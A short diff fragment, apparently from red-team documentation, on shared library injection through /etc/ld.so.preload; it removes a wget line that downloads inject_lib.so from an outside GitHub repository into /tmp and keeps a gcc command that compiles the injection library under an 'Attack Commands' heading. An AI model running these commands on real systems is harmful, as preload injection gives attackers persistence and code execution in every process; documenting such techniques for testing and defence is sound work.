@@ -1,6 +1,4 @@
-  
- wget -P /tmp/ https://github.com/jage1nf/testlib/blob/main/inject_lib.so  
- gcc -shared -fPIC ./inject_lib.c -o inject_lib.so -ldl  
+gcc -shared -fPIC ./inject_lib.c -o inject_lib.so -ldl  
   
 1. Shared Library Injection via /etc/ld.so.preload  
 Attack Commands:  
